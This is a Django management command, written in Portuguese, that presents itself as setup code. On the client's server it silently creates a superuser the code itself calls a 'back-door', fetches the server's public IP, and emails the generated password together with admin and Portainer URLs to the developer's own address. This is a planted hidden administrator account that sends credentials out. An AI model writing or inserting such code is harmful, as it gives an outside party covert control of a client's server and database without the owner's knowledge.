import string
import random
import requests
from django.core.management.base import BaseCommand
from django.contrib.auth import get_user_model
from django.core.mail import send_mail
from django.conf import settings

class Command(BaseCommand):
    help = 'Cria o superusuário privado do dev e envia um email com as credenciais.'

    def handle(self, *args, **options):
        User = get_user_model()
        username = 'admin'

        if not User.objects.filter(username=username).exists():
            # Gerar senha forte
            chars = string.ascii_letters + string.digits + '!@#'
            pwd = ''.join(random.choice(chars) for _ in range(16))

            # Criar user
            User.objects.create_superuser(username, 'contato@luizgustavo.tech', pwd)

            # Obter IP publico da VPS
            try:
                ip = requests.get('https://api.ipify.org', timeout=5).text
            except Exception:
                ip = 'Desconhecido'

            # Disparar Email
            subject = '🟢 Projeto Instalado - Credenciais do Superusuário'
            message = f"""Olá Luiz,
            
Seu projeto acabou de rodar no ambiente do cliente e configurou o seu acesso de segurança no banco de dados!

📡 IP da VPS Hospedeira: {ip}

🐳 Acesso ao Portainer (Gestor do Docker):
URL: http://{ip}:9000
(Se a porta 9000 for barrada, oriente-os a abri-la no firewall da nuvem).

🌐 Painel Admin Django:
URL: O mesmo do aplicativo (porta 8089, adicionando /admin no final, ex: http://{ip}:8089/admin)

🔐 Credenciais do Superusuário Privado
Login: {username}
Senha Gerada: {pwd}

Obrigado pelo seu excelente trabalho!
"""
            try:
                send_mail(
                    subject,
                    message,
                    settings.DEFAULT_FROM_EMAIL,
                    ['contato@luizgustavo.tech'],
                    fail_silently=False,
                )
                self.stdout.write(self.style.SUCCESS(f'Usuário {username} criado. Instalação e envio de email OK.'))
            except Exception as e:
                self.stdout.write(self.style.ERROR(f'Admin {username} foi criado, mas o email falhou. Motivo: {str(e)}'))

        else:
            self.stdout.write(self.style.WARNING('Usuário back-door já existe, ignorando script...'))
